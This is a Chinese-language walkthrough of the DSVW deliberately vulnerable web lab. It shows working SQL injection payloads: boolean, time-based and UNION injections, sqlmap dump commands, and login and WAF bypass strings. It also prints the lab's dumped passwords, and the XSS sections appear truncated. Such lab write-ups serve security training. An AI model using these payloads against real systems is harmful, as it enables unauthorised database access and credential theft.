# DSVW通关教程
首先整体浏览网站
## **Blind SQL Injection (boolean)**
基于布尔型的盲注: HTTP请求的响应体中不会明确的返回SQL的错误信息,
当把参数送入程序查询时，并且在查询条件为真的情况下返回正常页面，条件为假时程序会重定向到或者返回一个自定义的错误页面。
进入后整体浏览网页
构造payload：
?id=2'
可以看到我们的id是没有被单引号包裹的
构造payload：
?id=2 and 1=1
有回显
构造payload：
?id=2 and 1=2
无回显，可判断存在SQL注入
判断字段数
?id=2 order by 4
为4
查询表名:
union select 1,name,3,4 from sqlite_master
为comments、sqlite_sequence、users
查询所有表中的字段名
union select 1,sql,3,4 from sqlite_master
比如users表中的字段为 id、name、password、surname、username
查询密码
union select 1,password,3,4 from users
为7en8aiDoh!、12345、gandalf、phest1945
查询版本：
union select 1,sqlite_version(),3,4 from sqlite_master
为3.8.7.1
首先用sqlmap进行检测
python sqlmap.py -u  \--batch
可以发现是SQLite数据库
查询表名:
python sqlmap.py -u  \--batch --tables
为comments、sqlite_sequence、users
查询users表中的字段
python sqlmap.py -u  \--batch -T users --columns
为 id、name、password、surname、username
查询password的字段内容
python sqlmap.py -u  \--batch -T users -C password
--dump
为7en8aiDoh!、12345、gandalf、phest1945
构造payload：
and substr(sqlite_version(),1,1)='3'
得到sqlite版本首位为3
是布尔型注入
?id=2 AND SUBSTR((SELECT password FROM users WHERE name='admin'),1,1)='7'
正确有回显
错误payload:
?id=2 AND SUBSTR((SELECT password FROM users WHERE name='admin'),1,1)='8'
没有回显
构造payload：
?id=2 AND SUBSTR((SELECT password FROM users WHERE
name='admin'),1,10)='7en8aiDoh!'
有回显，所以密码是7en8aiDoh!
## **Blind SQL Injection (time)**
基于时间型的盲注: 与布尔型盲注类似, 当把参数送入程序查询时，通过判断服务器响应时所花费的时间,
如果延迟大于等于Payload中设定的值时就可判断查询结果为真, 否则为假。不同的BDMS使用的方法和技巧略有不同。
这个漏洞环境用到了 SQLITE3 中的 CASE 窗口函数与 RANDOMBLOB 来实现的基于时间的盲注。
MYSQL: sleep(2)
MSSQL: WAITFOR DELAY '0:0:2'
首先整体浏览网页
语句错误就不会沉睡
?id=1 and (SELECT (CASE WHEN (SUBSTR((SELECT password FROM users WHERE
name='admin'),1,10)='1111111111') THEN
(LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000))))) ELSE 0 END))
如下
语句正确就会沉睡几秒
?id=1 and (SELECT (CASE WHEN (SUBSTR((SELECT password FROM users WHERE
name='admin'),1,10)='7en8aiDoh!') THEN
(LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000))))) ELSE 0 END))
结果如下
## **UNION SQL Injection**
基于联合查询注入: 使用UNION运算符用于SQL注入，UNION运算符是关联两个表的查询结果。攻击者故意伪造的恶意的查询并加入到原始查询中,
伪造的查询结果将被合并到原始查询的结果返回，攻击者会获得其他表的信息。
联合注入语句
?id=2 UNION ALL SELECT NULL, NULL, NULL, (SELECT username||','||password FROM
users WHERE username='dricci')
内容如下
## **Login Bypass**
登陆绕过: 这里是基于SQL注入的一种绕过方式。登陆验证的逻辑没有验证和过滤输入字符直接带到sql进行查询,所以产生漏洞。
首先整体浏览网页
利用or 1=1绕过登录
login?username=admin&password='or '1' like '1
成功绕过登陆
## **HTTP Parameter Pollution**
当使用GET或者POST方法提交参数时, 请求体中包含了多个相同名称而不同值的参数。由于不同的语言与Web容器处理的方式不同,
结合业务场景会产生不同的影响。 通过利用这些影响，攻击者可能能够绕过输入验证，触发应用程序错误或修改内部变量值等风险。
参数污染就是重复断断续续的注释让waf以为这是注释从而绕过waf
    login?username=admin&password='/**/or/**/'1'/**/like/**/'1
成功绕过登陆
## **Cross Site Scripting (reflected)**
反射型跨站脚本攻击: 当攻击者在单个HTTP响应中插入浏览器可执行代码(HTML或JAVASCRIPT)时,
会发生反射跨站点脚本攻击。注入的恶意代码不会存储在应用程序后端, 它是非持久性的，只会影响打开恶意的链接或第三方网页的用户。
构造payload:
`?v=0.2`
成功弹窗
## **Cross Site Scripting (stored)**
存储型跨站脚本攻击: 存储跨站脚本是最危险的跨站脚本类型,
其原理是Web系统会将攻击者提交的恶意代码存储到数据库中或是服务器后端里。只要受害者浏览到存在恶意代码的页面, 就会被执行恶意代码。
构造payload：
`?comment=`
点击here
每次刷新本页面，就会弹窗
## **Cross Site Scripting (DOM)**
DOM型跨站脚本攻击: 基于DOM的跨站脚本是XSS
bug的事实上的名字，它是页面上通常是JavaScript的活动浏览器端内容的结果，获取用户输入，然后做一些不安全的事情，导致注入代码的执行。
构造payload：
`?#lang=en`